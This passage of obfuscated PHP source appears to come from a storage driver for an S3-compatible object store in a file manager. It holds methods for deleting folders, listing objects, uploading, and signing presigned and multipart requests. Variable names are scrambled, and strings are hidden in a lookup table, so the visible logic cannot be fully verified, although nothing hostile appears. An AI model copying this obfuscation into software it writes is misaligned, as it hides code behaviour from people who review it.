$ıŸ¡Æçş); } public function delFolder($Úà—¢‘) { $µ´œ·ë’ =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->exist($Úà—¢‘)) { return !0; } $this->listItemCache = !1; $°˜íıÄ = $this->fileList($Úà—¢‘); $this->listItemCache = !0; $Ã ¯àĞ÷ = trim($Úà—¢‘, $µ´œ·ë’[8]) . $µ´œ·ë’[8]; if (!empty($Úà—¢‘) && $Úà—¢‘ !== $µ´œ·ë’[230] && !in_array($Ã ¯àĞ÷, $°˜íıÄ[$µ´œ·ë’[85]])) { $°˜íıÄ[$µ´œ·ë’[85]][] = $Ã ¯àĞ÷; } $‚êöÆ§Ğ = $this->delByBatch($°˜íıÄ[$µ´œ·ë’[86]]); if (!$‚êöÆ§Ğ) { return !1; } $‚êöÆ§Ğ = $this->delByBatch($°˜íıÄ[$µ´œ·ë’[85]]); if (!$‚êöÆ§Ğ) { return !1; } return $this->delFile($Ã ¯àĞ÷); } private function delByBatch($Öã®®ĞÈ) { foreach (array_chunk($Öã®®ĞÈ, 1000) as $¨¶öÁ) { $©¥¤å® = $this->client->deleteObjects($this->bucket, $¨¶öÁ); if (!$©¥¤å®) { return !1; } } return !0; } public function rename($ÀğıâğÇ, $­Œ»ª”) { return $this->renameObject($ÀğıâğÇ, $­Œ»ª”); } public function listPath($ƒØÜºêã, $¯ƒ„‡Ù = false) { $Ï„¬ÜÙù =& $_SERVER[¡¬ıÜ ƒ]; $àùÉŠ¦ = $this->fileList($ƒØÜºêã, $Ï„¬ÜÙù[8], !0); foreach ($àùÉŠ¦[$Ï„¬ÜÙù[85]] as $Ûˆ“şŞ => $šØïœñš) { $àùÉŠ¦[$Ï„¬ÜÙù[85]][$Ûˆ“şŞ] = $this->folderInfo($šØïœñš, $¯ƒ„‡Ù, $šØïœñš); } foreach ($àùÉŠ¦[$Ï„¬ÜÙù[86]] as $Ûˆ“şŞ => $šØïœñš) { $àùÉŠ¦[$Ï„¬ÜÙù[86]][$Ûˆ“şŞ] = $this->fileInfo($šØïœñš[$Ï„¬ÜÙù[32]], $¯ƒ„‡Ù, $šØïœñš); } return $àùÉŠ¦; } protected function infoChildren($ºüô›ô—, &$ø»ûĞô) { $Øö„ˆâÖ =& $_SERVER[¡¬ıÜ ƒ]; $çâŸ™­ = $this->fileList($ºüô›ô—, $Øö„ˆâÖ[12], !0); $ø»ûĞô[$Øö„ˆâÖ[81]] += count($çâŸ™­[$Øö„ˆâÖ[85]]); $ø»ûĞô[$Øö„ˆâÖ[80]] += count($çâŸ™­[$Øö„ˆâÖ[86]]); foreach ($çâŸ™­[$Øö„ˆâÖ[86]] as $›Å£ãÒ´) { if (!$›Å£ãÒ´ || !$›Å£ãÒ´[$Øö„ˆâÖ[79]]) { continue; } $ø»ûĞô[$Øö„ˆâÖ[79]] += $›Å£ãÒ´[$Øö„ˆâÖ[79]]; } } private function fileInfo($’îŠÛÎÆ, $á‘Š î— = false, $Ø‰ÎãÆ = array()) { $²¤»‹ =& $_SERVER[¡¬ıÜ ƒ]; $ÉŞäÇŸ = array($²¤»‹[32] => $this->pathThis($’îŠÛÎÆ), $²¤»‹[87] => $this->getPathOuter($’îŠÛÎÆ), $²¤»‹[33] => $²¤»‹[232], $²¤»‹[169] => $this->ext($’îŠÛÎÆ), $²¤»‹[79] => isset($Ø‰ÎãÆ[$²¤»‹[79]]) ? $Ø‰ÎãÆ[$²¤»‹[79]] : 0); if ($á‘Š î—) { return $ÉŞäÇŸ; } $ÉŞäÇŸ[$²¤»‹[233]] = $ÉŞäÇŸ[$²¤»‹[88]] = 0; $ÉŞäÇŸ[$²¤»‹[234]] = $ÉŞäÇŸ[$²¤»‹[235]] = !0; if (empty($Ø‰ÎãÆ)) { $Ø‰ÎãÆ = $this->objectMeta($’îŠÛÎÆ); if (!$Ø‰ÎãÆ) { return $ÉŞäÇŸ; } } if (isset($Ø‰ÎãÆ[$²¤»‹[236]]) && $Ø‰ÎãÆ[$²¤»‹[236]]) { $ÉŞäÇŸ[$²¤»‹[237]] = $Ø‰ÎãÆ[$²¤»‹[236]]; } if (isset($Ø‰ÎãÆ[$²¤»‹[206]])) { $ÉŞäÇŸ[$²¤»‹[88]] = $Ø‰ÎãÆ[$²¤»‹[206]]; } if (isset($Ø‰ÎãÆ[$²¤»‹[79]])) { $ÉŞäÇŸ[$²¤»‹[79]] = $Ø‰ÎãÆ[$²¤»‹[79]]; } return $ÉŞäÇŸ; } private function folderInfo($Øª‚šÅû, $—˜øŠ¤ì = false, $¶À£ñ¥ = array()) { $š¸©ıœù =& $_SERVER[¡¬ıÜ ƒ]; $Ó‹à’½ò = array($š¸©ıœù[32] => $this->pathThis($Øª‚šÅû), $š¸©ıœù[87] => $this->getPathOuter($š¸©ıœù[8] . $Øª‚šÅû), $š¸©ıœù[33] => $š¸©ıœù[78]); if ($—˜øŠ¤ì) { return $Ó‹à’½ò; } $Ó‹à’½ò[$š¸©ıœù[233]] = $Ó‹à’½ò[$š¸©ıœù[88]] = 0; $Ó‹à’½ò[$š¸©ıœù[234]] = $Ó‹à’½ò[$š¸©ıœù[235]] = !0; if ($Øª‚šÅû == $š¸©ıœù[12]) { return $Ó‹à’½ò; } if (empty($¶À£ñ¥)) { $¶À£ñ¥ = $this->objectMeta(trim($Øª‚šÅû, $š¸©ıœù[8]) . $š¸©ıœù[8]); } if (isset($¶À£ñ¥[$š¸©ıœù[206]])) { $Ó‹à’½ò[$š¸©ıœù[233]] = $¶À£ñ¥[$š¸©ıœù[206]]; } return $Ó‹à’½ò; } private function fileList($‡ïÅ¦®, $‚ëä‘ = '', $¦¿Ô½Ğ = 0) { $ªµ´±•€ =& $_SERVER[¡¬ıÜ ƒ]; $Ÿ¬ÖñéÁ = rtrim($‡ïÅ¦®, $ªµ´±•€[8]) . $ªµ´±•€[8]; $²á½ó£Æ = $this->listObjs($Ÿ¬ÖñéÁ, null, null, $‚ëä‘); if (!$²á½ó£Æ) { return array($ªµ´±•€[85] => array(), $ªµ´±•€[86] => array()); } $‹ˆÁìŠ” = $¬…±™½œ = array(); foreach ($²á½ó£Æ[$ªµ´±•€[238]] as $çà“äÍ) { $é¡ÖÑ©– = $çà“äÍ[$ªµ´±•€[32]]; if ($é¡ÖÑ©– == $Ÿ¬ÖñéÁ) { continue; } $¯šØæšé = isset($çà“äÍ[$ªµ´±•€[79]]) ? $çà“äÍ[$ªµ´±•€[79]] : 0; $¹Õè¼õÇ = $¯šØæšé == 0 && substr($é¡ÖÑ©–, strlen($é¡ÖÑ©–) - 1, 1) == $ªµ´±•€[8] ? !0 : !1; $this->cacheMethodInfoSet($é¡ÖÑ©–, $¹Õè¼õÇ, $çà“äÍ); if ($¹Õè¼õÇ) { $‹ˆÁìŠ”[] = $é¡ÖÑ©–; continue; } $¬…±™½œ[] = $¦¿Ô½Ğ ? $çà“äÍ : $é¡ÖÑ©–; } foreach ($²á½ó£Æ[$ªµ´±•€[239]] as $çà“äÍ) { $‹ˆÁìŠ”[] = $çà“äÍ[$ªµ´±•€[32]]; $this->cacheMethodInfoSet($çà“äÍ[$ªµ´±•€[32]], !0); } $this->cacheMethodInfoSet($‡ïÅ¦®, !0); return array($ªµ´±•€[85] => $‹ˆÁìŠ”, $ªµ´±•€[86] => $¬…±™½œ); } private function listObjs($Í•¢Å¶¦, $»Æ´¤…Á = null, $Î”»Í¯Ş = null, $°İ¿Ÿçñ = null) { $­úéÅ³Ü =& $_SERVER[¡¬ıÜ ƒ]; $Í•¢Å¶¦ = trim($Í•¢Å¶¦, $­úéÅ³Ü[8]); $ß£ßÔèÕ = empty($Í•¢Å¶¦) && $Í•¢Å¶¦ !== $­úéÅ³Ü[230] ? $­úéÅ³Ü[12] : $Í•¢Å¶¦ . $­úéÅ³Ü[8]; return $this->client->getBucket($this->bucket, $ß£ßÔèÕ, $»Æ´¤…Á, $Î”»Í¯Ş, $°İ¿Ÿçñ, !0); } public function has($Ğ·®õ¦½, $¾æğ±á± = false, $¸ÕÉîÖ = true) { $»åóÎ¶ =& $_SERVER[¡¬ıÜ ƒ]; $Ğ·®õ¦½ = trim($Ğ·®õ¦½, $»åóÎ¶[8]); $˜È¤½ù = empty($Ğ·®õ¦½) && $Ğ·®õ¦½ !== $»åóÎ¶[230] ? $»åóÎ¶[12] : $Ğ·®õ¦½ . $»åóÎ¶[8]; $Õ¬–ùÖ€ = null; $æ…Ùä¯ = 500; $¿ÎæßæË = $»åóÎ¶[8]; $Ç®ø½ÊÏ = $‰ı©ÃÆÅ = array(); while (!0) { $ÛÏ»Ñß = $this->listObjs($Ğ·®õ¦½, $Õ¬–ùÖ€, $æ…Ùä¯, $¿ÎæßæË); if (!$ÛÏ»Ñß) { break; } $Õ¬–ùÖ€ = $ÛÏ»Ñß[$»åóÎ¶[240]]; $ÍÉ©ä³ = $ÛÏ»Ñß[$»åóÎ¶[238]]; $ì„®ÁãÔ = $ÛÏ»Ñß[$»åóÎ¶[239]]; if (empty($ÍÉ©ä³) && empty($ì„®ÁãÔ)) { break; } if (count($ÍÉ©ä³) == 1 && $ÍÉ©ä³[0][$»åóÎ¶[32]] == $˜È¤½ù) { break; } if ($¾æğ±á±) { if (count($ÍÉ©ä³)) { $ÍÉ©ä³ = array_column($ÍÉ©ä³, $»åóÎ¶[32]); $Ç®ø½ÊÏ = array_merge($Ç®ø½ÊÏ, $ÍÉ©ä³); } if (count($ì„®ÁãÔ)) { $ì„®ÁãÔ = array_column($ì„®ÁãÔ, $»åóÎ¶[32]); $‰ı©ÃÆÅ = array_merge($‰ı©ÃÆÅ, $ì„®ÁãÔ); } if ($Õ¬–ùÖ€ === null) { break; } continue; } if ($¸ÕÉîÖ) { if (!empty($ÍÉ©ä³)) { if (count($ÍÉ©ä³) > 1 || isset($ÍÉ©ä³[0][$»åóÎ¶[32]]) && $ÍÉ©ä³[0][$»åóÎ¶[32]] != $˜È¤½ù) { return !0; } } } else { if (!empty($ì„®ÁãÔ)) { return !0; } } if ($Õ¬–ùÖ€ === null) { break; } } if ($¾æğ±á±) { $Ç®ø½ÊÏ = array_diff($Ç®ø½ÊÏ, array($˜È¤½ù)); $Ç®ø½ÊÏ = count(array_unique($Ç®ø½ÊÏ)); $‰ı©ÃÆÅ = count(array_unique($‰ı©ÃÆÅ)); return array($»åóÎ¶[241] => $Ç®ø½ÊÏ, $»åóÎ¶[242] => $‰ı©ÃÆÅ); } return !1; } public function listAll($Ï¤Şˆà˜) { $î¼óŞæá =& $_SERVER[¡¬ıÜ ƒ]; $º®±›Ô = $this->fileList($Ï¤Şˆà˜, $î¼óŞæá[12], !0); $¨…À¦¢ = array_to_keyvalue($º®±›Ô[$î¼óŞæá[86]], $î¼óŞæá[32]); foreach ($º®±›Ô[$î¼óŞæá[85]] as $³Ş¯™›À) { if (is_string($³Ş¯™›À)) { $¨…À¦¢[$³Ş¯™›À] = array($î¼óŞæá[79] => 0); } } return $this->listAllFiles($Ï¤Şˆà˜, $¨…À¦¢); } public function canRead($§¨ˆÔä) { $¬¥åôÕõ =& $_SERVER[¡¬ıÜ ƒ]; $ öÑ úÑ = $this->client->getAccessControlPolicy($this->bucket, $§¨ˆÔä); if (!$ öÑ úÑ) { return !1; } return in_array($ öÑ úÑ, array($¬¥åôÕõ[243], $¬¥åôÕõ[244], $¬¥åôÕõ[245])) ? !0 : !1; } public function canWrite($ÎÚ²»õ¶) { $»š¥„ß× =& $_SERVER[¡¬ıÜ ƒ]; $ôåçøÃ = $this->client->getAccessControlPolicy($this->bucket, $ÎÚ²»õ¶); if (!$ôåçøÃ) { return !1; } return in_array($ôåçøÃ, array($»š¥„ß×[243], $»š¥„ß×[244])) ? !0 : !1; } public function getContent($áéîøå) { return $this->client->getObject($this->bucket, $áéîøå); } public function setContent($îÍ•íò—, $’¢‘ÒğÍ = '', $‹Öø¾µ« = false) { $§ª÷úÖñ =& $_SERVER[¡¬ıÜ ƒ]; $îÍ•íò— = $‹Öø¾µ« ? trim($îÍ•íò—, $§ª÷úÖñ[8]) . $§ª÷úÖñ[8] : $îÍ•íò—; $º”ùØ÷ = get_file_mime(get_path_ext($îÍ•íò—)); $ÚšâäĞø = $this->client->putObject($’¢‘ÒğÍ, $this->bucket, $îÍ•íò—, $§ª÷úÖñ[231], array(), $º”ùØ÷); if (!$ÚšâäĞø) { return !1; } if ($‹Öø¾µ«) { return !0; } return $ÚšâäĞø ? !0 : !1; } public function fileSubstr($­ûß¾§—, $—êÖŞÓİ, $µì×÷Ö²) { $â¼ÇåÀØ = $—êÖŞÓİ + $µì×÷Ö² - 1; return $this->client->getObject($this->bucket, $­ûß¾§—, array($_SERVER[¡¬ıÜ ƒ][246] => "\x62\x79\x74\x65\163\x3d{$—êÖŞÓİ}\55{$â¼ÇåÀØ}")); } public function upload($á†Î©ê, $À›û™±¥, $ÍÂœùË’ = false, $òıÅÃ = REPEAT_REPLACE) { $¢èË‰—Æ =& $_SERVER[¡¬ıÜ ƒ]; $ëÜëğòç = array($¢èË‰—Æ[247] => @md5_file($À›û™±¥)); $’Û¯ğ— = array($¢èË‰—Æ[248] => get_file_mime(get_path_ext($á†Î©ê))); if (IO::size($À›û™±¥) <= 1024 * 1024 * 200) { $Æı§½ñ = $this->client->putObjectFile($À›û™±¥, $this->bucket, $á†Î©ê, $¢èË‰—Æ[231], $ëÜëğòç, $’Û¯ğ—); return !empty($Æı§½ñ) ? $this->getPathOuter($á†Î©ê) : !1; } $ò°ÚÂõ = $this->client->multiUploadObject($À›û™±¥, $this->bucket, trim($á†Î©ê, $¢èË‰—Æ[8]), $ëÜëğòç, $’Û¯ğ—); return $ò°ÚÂõ ? $this->getPathOuter($á†Î©ê) : !1; } public function download($çÕ­‰†è, $Ú®ìÜş) { if (!@is_dir($this->pathFather($Ú®ìÜş)) && !IO::mkdir($this->pathFather($Ú®ìÜş))) { return !1; } $´ıÁï¶¦ = $this->client->getObject($this->bucket, $çÕ­‰†è, array(), $Ú®ìÜş); return $´ıÁï¶¦ !== !1 ? $Ú®ìÜş : !1; } public function link($ˆ÷ŸŞ„Ï, $“ÕîçÕÏ = array()) { return $this->getPreSignedURL($ˆ÷ŸŞ„Ï, 3600 * 12, $“ÕîçÕÏ); } private function getPreSignedURL($„Ê»êÛè, $ŒÉ‹ã„Ë, $‡ª»÷Ÿê = array(), $İ¾¡×Àå = "\107\105\x54") { $×ãÀËï¥ =& $_SERVER[¡¬ıÜ ƒ]; $„Ê»êÛè = trim($„Ê»êÛè, $×ãÀËï¥[8]); if ($this->signVer == $×ãÀËï¥[249]) { return $this->client->getPreSignedV2URL($this->bucket, $„Ê»êÛè, $ŒÉ‹ã„Ë, $İ¾¡×Àå, $‡ª»÷Ÿê); } return $this->client->getPreSignedV4URL($this->bucket, $„Ê»êÛè, $ŒÉ‹ã„Ë, array(), $İ¾¡×Àå, $‡ª»÷Ÿê); } public function fileOut($ŠÑŞÕñ, $¥¹¸Ï‡‘ = false, $¸ÍğæóĞ = false, $ƒ‚É­Å¾ = '') { $ŒÒ¡çõÊ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->isFileOutServer()) { return $this->fileOutServer($ŠÑŞÕñ, $¥¹¸Ï‡‘, $¸ÍğæóĞ, $ƒ‚É­Å¾); } if (!$¸ÍğæóĞ) { $¸ÍğæóĞ = $this->pathThis($ŠÑŞÕñ); } $Û½ŞûÃ = get_file_mime(get_path_ext($¸ÍğæóĞ)); if ($Û½ŞûÃ == $ŒÒ¡çõÊ[250]) { return parent::fileOut($ŠÑŞÕñ, $¥¹¸Ï‡‘, $¸ÍğæóĞ, $ƒ‚É­Å¾); } $·×ºı¦ç = array($ŒÒ¡çõÊ[251] => $Û½ŞûÃ); if ($¥¹¸Ï‡‘) { $·×ºı¦ç[$ŒÒ¡çõÊ[252]] = $ŒÒ¡çõÊ[253] . rawurlencode($¸ÍğæóĞ); } else { } $ÃÁ…¯ÊÄ = $this->link($ŠÑŞÕñ, $·×ºı¦ç); $this->fileOutLink($ÃÁ…¯ÊÄ); } public function fileOutServer($î”—‚ûÁ, $Ûø·¦³ë = false, $Ä×¡‹•è = false, $ü§Œè³Í = '') { parent::fileOut($î”—‚ûÁ, $Ûø·¦³ë, $Ä×¡‹•è, $ü§Œè³Í); } public function fileOutImageServer($ÄÈ€”“ï, $‡ğñÄòŸ = 250) { parent::fileOutImage($ÄÈ€”“ï, $‡ğñÄòŸ); } public function hashMd5($àú­¡—Â, $Ã—¢¥ÑÙ = '') { $†Ë½âş¢ = $this->objectMeta($àú­¡—Â); if (!$†Ë½âş¢) { return !1; } $Ã—¢¥ÑÙ = $Ã—¢¥ÑÙ ? $Ã—¢¥ÑÙ : _get($†Ë½âş¢, $_SERVER[¡¬ıÜ ƒ][254]); return $Ã—¢¥ÑÙ; } public function uploadFormData($´¾¿¥¸Ú, $Ò¥¨Ñœ = 3600) { $—Ó·ãÖü =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->_isClientAsync()) { $¬¸È†™İ = $this->getPreSignedURL($´¾¿¥¸Ú, $Ò¥¨Ñœ, array(), $—Ó·ãÖü[255]); return array($—Ó·ãÖü[208] => str_replace($—Ó·ãÖü[218], $—Ó·ãÖü[256], $¬¸È†™İ)); } if (isset($GLOBALS[$—Ó·ãÖü[6]][$—Ó·ãÖü[92]][$—Ó·ãÖü[257]]) && $GLOBALS[$—Ó·ãÖü[6]][$—Ó·ãÖü[92]][$—Ó·ãÖü[257]] == $—Ó·ãÖü[230]) { return $this->uploadMultiData($´¾¿¥¸Ú, $Ò¥¨Ñœ); } if ($this->signVer == $—Ó·ãÖü[249]) { return $this->uploadFormDataV2($´¾¿¥¸Ú, $Ò¥¨Ñœ); } return $this->uploadFormDataV4($´¾¿¥¸Ú, $Ò¥¨Ñœ); } public function uploadFormDataV2($”İÜÄ§Ü, $ªâ“¡ÛÖ = 3600) { $ŸÖ©À =& $_SERVER[¡¬ıÜ ƒ]; $ó¸û€©Š = $this->pathFather($”İÜÄ§Ü); $²´Âé€ = $this->client->getHttpUploadPostParams($this->bucket, $ó¸û€©Š, $ŸÖ©À[231], $ªâ“¡ÛÖ); $ÊÒŠØÖ„ = array_merge((array) $²´Âé€, array($ŸÖ©À[258] => $ŸÖ©À[249], $ŸÖ©À[208] => $this->getHost())); if ($this->_isClientAsync()) { unset($ÊÒŠØÖ„[$ŸÖ©À[258]]); } return $ÊÒŠØÖ„; } public function uploadFormDataV4($½Íì¬«¶, $óÏÜòığ = 3600) { $şŒ†‘¢ğ =& $_SERVER[¡¬ıÜ ƒ]; $µï¡¿¢½ = $şŒ†‘¢ğ[231]; $ÏßøÙ¶í = $şŒ†‘¢ğ[259]; $¡¥®ì£Ù = $şŒ†‘¢ğ[62]; $ñüæôŞŸ = gmdate($şŒ†‘¢ğ[260]); $Í½¥ŠÁ¿ = gmdate($şŒ†‘¢ğ[261]); $–Å·ğÃë = $şŒ†‘¢ğ[262]; $Í„ëÒö = $óÏÜòığ . $şŒ†‘¢ğ[12]; $´ŞüÁ™† = $şŒ†‘¢ğ[263]; $Â®Ÿ¼¿Æ = array($this->accessKey, $Í½¥ŠÁ¿, $this->region, $¡¥®ì£Ù, $–Å·ğÃë); $¶ÔˆÁ÷Ã = implode($şŒ†‘¢ğ[8], $Â®Ÿ¼¿Æ); $ºÍÔ İ¤ = array($şŒ†‘¢ğ[264] => gmdate($şŒ†‘¢ğ[265], strtotime($şŒ†‘¢ğ[266])), $şŒ†‘¢ğ[267] => array(array($şŒ†‘¢ğ[268] => $this->bucket), array($şŒ†‘¢ğ[269], $şŒ†‘¢ğ[270], $şŒ†‘¢ğ[12]), array($şŒ†‘¢ğ[269], $şŒ†‘¢ğ[271], $şŒ†‘¢ğ[12]), array($şŒ†‘¢ğ[272] => $´ŞüÁ™†), array($şŒ†‘¢ğ[273] => $¶ÔˆÁ÷Ã), array($şŒ†‘¢ğ[274] => $ÏßøÙ¶í), array($şŒ†‘¢ğ[275] => $ñüæôŞŸ), array($şŒ†‘¢ğ[276] => $Í„ëÒö))); $ÙİŒÃ§¼ = base64_encode(json_encode($ºÍÔ İ¤)); $±å´Í°Ù = hash_hmac($şŒ†‘¢ğ[277], $Í½¥ŠÁ¿, $şŒ†‘¢ğ[278] . $this->secret, !0); $øí˜ìÒ = hash_hmac($şŒ†‘¢ğ[277], $this->region, $±å´Í°Ù, !0); $—Úõüô = hash_hmac($şŒ†‘¢ğ[277], $¡¥®ì£Ù, $øí˜ìÒ, !0); $Åó”¸‡„ = hash_hmac($şŒ†‘¢ğ[277], $–Å·ğÃë, $—Úõüô, !0); $Ùñ²ĞÚó = hash_hmac($şŒ†‘¢ğ[277], $ÙİŒÃ§¼, $Åó”¸‡„); $»½¥ûàú = array($şŒ†‘¢ğ[248] => $şŒ†‘¢ğ[12], $şŒ†‘¢ğ[272] => $´ŞüÁ™†, $şŒ†‘¢ğ[279] => $ÙİŒÃ§¼, $şŒ†‘¢ğ[273] => $¶ÔˆÁ÷Ã, $şŒ†‘¢ğ[274] => $ÏßøÙ¶í, $şŒ†‘¢ğ[275] => $ñüæôŞŸ, $şŒ†‘¢ğ[276] => $Í„ëÒö, $şŒ†‘¢ğ[280] => $Ùñ²ĞÚó, $şŒ†‘¢ğ[258] => $şŒ†‘¢ğ[249], $şŒ†‘¢ğ[208] => $this->getHost()); if ($this->_isClientAsync()) { unset($»½¥ûàú[$şŒ†‘¢ğ[258]]); } return $»½¥ûàú; } public function uploadMultiData($£Ğô±…¯, $ÍÖ¿ĞÊñ = 3600) { $§­«·ë’ =& $_SERVER[¡¬ıÜ ƒ]; $²ûœäå = $this->signVer == $§­«·ë’[249] ? gmdate($§­«·ë’[281]) : gmdate($§­«·ë’[282]); $åË€²Ö = array(); $€’‚Ö¾‰ = $this->client->getUploadId($this->bucket, $£Ğô±…¯, $åË€²Ö); if (!$€’‚Ö¾‰) { return !1; } $Á­×åÂò = array($§­«·ë’[283] => $€’‚Ö¾‰, $§­«·ë’[208] => $this->getHost() . $§­«·ë’[8] . $this->pathEncode($£Ğô±…¯), $§­«·ë’[284] => $²ûœäå, $§­«·ë’[97] => $£Ğô±…¯, $§­«·ë’[258] => $this->signVer); if ($this->_isClientAsync()) { unset($Á­×åÂò[$§­«·ë’[258]]); } return $Á­×åÂò; } public function uploadMultiAuth($ª—İºèÓ, $®–îª‹ = array()) { $î‡ÜÛß¦ =& $_SERVER[¡¬ıÜ ƒ]; if ($this->signVer == $î‡ÜÛß¦[249]) { if (isset($®–îª‹[$î‡ÜÛß¦[285]])) { return $this->uploadPartAuthV2($ª—İºèÓ, $®–îª‹); } return $this->uploadListAuthV2($ª—İºèÓ, $®–îª‹); } if (isset($®–îª‹[$î‡ÜÛß¦[285]])) { return $this->uploadPartAuthV4($ª—İºèÓ, $®–îª‹); } return $this->uploadListAuthV4($ª—İºèÓ, $®–îª‹); } public function uploadPartAuthV2($¼¤šã«¹, $›˜¡ÔÚ = array()) { $Õšñ£ù =& $_SERVER[¡¬ıÜ ƒ]; $ƒóÈÆá = $›˜¡ÔÚ[$Õšñ£ù[97]]; $ù‘È¨ú† = gmdate($Õšñ£ù[281]); $¥Ó¢ÊŸ‹ = array_intersect_key($›˜¡ÔÚ, array_flip(array($Õšñ£ù[285], $Õšñ£ù[283]))); ksort($¥Ó¢ÊŸ‹); $“Şı©ã = $¥Ó¢ÊŸ‹ ? $Õšñ£ù[76] . http_build_query($¥Ó¢ÊŸ‹, null, $Õšñ£ù[286], PHP_QUERY_RFC3986) : $Õšñ£ù[12]; $´î„®ì² = array($Õšñ£ù[255], $Õšñ£ù[12], $Õšñ£ù[123], $Õšñ£ù[12], "\170\x2d\x61\155\x7a\55\144\141\x74\145\72{$ù‘È¨ú†}", $Õšñ£ù[8] . $this->bucket . $Õšñ£ù[8] . $this->pathEncode($ƒóÈÆá) . $“Şı©ã); $»«·‚Ø’ = implode($Õšñ£ù[287], $´î„®ì²); $¡½¹àä = $this->client->__getSignature($»«·‚Ø’); return array($Õšñ£ù[288] => $¡½¹àä, $Õšñ£ù[284] => $ù‘È¨ú†); } public function uploadListAuthV2($µ¸®Àş, $¢ú›²–Â = array()) { $àÊÙâŸ =& $_SERVER[¡¬ıÜ ƒ]; $¤ºïÊîƒ = $¢ú›²–Â[$àÊÙâŸ[97]]; $Ö£·Ğ¯Ú = $¢ú›²–Â[$àÊÙâŸ[283]]; $”‹ŒîÍ£ = $this->client->listParts($this->bucket, $¤ºïÊîƒ, $Ö£·Ğ¯Ú); if (!$”‹ŒîÍ£) { return !1; } $ûÁ™ü  = gmdate($àÊÙâŸ[281]); $™€òıß = $àÊÙâŸ[289] . $Ö£·Ğ¯Ú; $°¸¬íÑô = array($àÊÙâŸ[290], $àÊÙâŸ[12], $àÊÙâŸ[123], $àÊÙâŸ[12], "\x78\55\141\155\x7a\x2d\144\x61\164\x65\x3a{$ûÁ™ü }", $àÊÙâŸ[8] . $this->bucket . $àÊÙâŸ[8] . $this->pathEncode($¤ºïÊîƒ) . $™€òıß); $ÀØïîö = implode($àÊÙâŸ[287], $°¸¬íÑô); $æÄ½Ø®Ë = $this->client->__getSignature($ÀØïîö); return array($àÊÙâŸ[288] => $æÄ½Ø®Ë, $àÊÙâŸ[284] => $ûÁ™ü , $àÊÙâŸ[291] => $”‹ŒîÍ£); } public function uploadPartAuthV4($³‰Ñ‹üé, $¡ÉƒæÜÀ = array()) { $ÚäşŸ™ë =& $_SERVER[¡¬ıÜ ƒ]; $¶ıÌÀ›’ = $¡ÉƒæÜÀ[$ÚäşŸ™ë[97]]; $ü²ßÅ²Ë = array($ÚäşŸ™ë[275] => gmdate($ÚäşŸ™ë[282]), $ÚäşŸ™ë[292] => _get($¡ÉƒæÜÀ, $ÚäşŸ™ë[293], hash($ÚäşŸ™ë[277], $ÚäşŸ™ë[12]))); $Ü•¬…¨Ö = explode($ÚäşŸ™ë[210], $this->getHost()); $»Õµ¶·Î = array($ÚäşŸ™ë[294] => $Ü•¬…¨Ö[1], $ÚäşŸ™ë[295] => $ÚäşŸ™ë[12], $ÚäşŸ™ë[248] => $ÚäşŸ™ë[123], $ÚäşŸ™ë[296] => $¡ÉƒæÜÀ[$ÚäşŸ™ë[79]]); $öÊƒñ‡„ = $ÚäşŸ™ë[255]; $İÙë¸ïó = $ÚäşŸ™ë[8] . $this->pathEncode($¶ıÌÀ›’); $Áû£çï¡ = array_intersect_key($¡ÉƒæÜÀ, array_flip(array($ÚäşŸ™ë[285], $ÚäşŸ™ë[283]))); $ø¿è³ö’ = $this->client->__getSignatureV4($ü²ßÅ²Ë, $»Õµ¶·Î, $öÊƒñ‡„, $İÙë¸ïó, $Áû£çï¡); return array($ÚäşŸ™ë[288] => $ø¿è³ö’, $ÚäşŸ™ë[292] => $ü²ßÅ²Ë[$ÚäşŸ™ë[292]], $ÚäşŸ™ë[284] => $ü²ßÅ²Ë[$ÚäşŸ™ë[275]]); } public function uploadListAuthV4($£æõ‰•, $ƒ‘ÍÔà¾ = array()) { $ú¤ôÜìü =& $_SERVER[¡¬ıÜ ƒ]; $•Ş½ØÀ = $ƒ‘ÍÔà¾[$ú¤ôÜìü[97]]; $öœ­ô´ = $ƒ‘ÍÔà¾[$ú¤ôÜìü[283]]; $› å¥×” = $this->client->listParts($this->bucket, $•Ş½ØÀ, $öœ­ô´); if (!$› å¥×”) { return !1; } $¡³ôºáÆ = $ú¤ôÜìü[297]; foreach ($› å¥×” as $úßóı®) { $¡³ôºáÆ .= $ú¤ôÜìü[298] . "\74\120\x61\x72\164\x4e\165\x6d\142\145\162\x3e{$úßóı®[$ú¤ôÜìü[299]]}\x3c\57\x50\141\x72\164\x4e\165\155\142\x65\162\x3e\12" . "\74\105\124\x61\x67\76{$úßóı®[$ú¤ôÜìü[300]]}\74\57\105\124\x61\147\76\xa" . $ú¤ôÜìü[301]; } $¡³ôºáÆ .= $ú¤ôÜìü[302]; $êÖ¢ª¾€ = array($ú¤ôÜìü[275] => gmdate($ú¤ôÜìü[282]), $ú¤ôÜìü[292] => hash($ú¤ôÜìü[277], $¡³ôºáÆ)); $ğ°Ã¬¥ = explode($ú¤ôÜìü[210], $this->getHost()); $Ã³²²¶š = array($ú¤ôÜìü[294] => $ğ°Ã¬¥[1], $ú¤ôÜìü[248] => $ú¤ôÜìü[123], $ú¤ôÜìü[296] => strlen($¡³ôºáÆ)); $À¸íê ‰ = $ú¤ôÜìü[290]; $ãè¬‡ûÎ = $ú¤ôÜìü[8] . $this->pathEncode($•Ş½ØÀ); $îç­¹Ïì = array($ú¤ôÜìü[283] => $öœ­ô´); $ ŒÜîÔÊ = $this->client->__getSignatureV4($êÖ¢ª¾€, $Ã³²²¶š, $À¸íê ‰, $ãè¬‡ûÎ, $îç­¹Ïì); return array($ú¤ôÜìü[288] => $ ŒÜîÔÊ, $ú¤ôÜìü[292] => $êÖ¢ª¾€[$ú¤ôÜìü[292]], $ú¤ôÜìü[284] => $êÖ¢ª¾€[$ú¤ôÜìü[275]], $ú¤ôÜìü[291] => $› å¥×”); } private function _isClientAsync() { $”„ƒ›ù =& $_SERVER[¡¬ıÜ ƒ]; static $‹ÛĞÈŒ = null; if ($‹ÛĞÈŒ === null) { $ç±Ã÷Ñ¿ = isset($_REQUEST[$”„ƒ›ù[303]]) ? json_decode($_REQUEST[$”„ƒ›ù[303]], !0) : !1; $‹ÛĞÈŒ = $ç±Ã÷Ñ¿ && _get($ç±Ã÷Ñ¿, $”„ƒ›ù[304]) == $”„ƒ›ù[305]; } return $‹ÛĞÈŒ; } public function getHost() { $ÃÇç‡“ø =& $_SERVER[¡¬ıÜ ƒ]; $›ËŠÖ‚ú = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ÃÇç‡“ø[70], 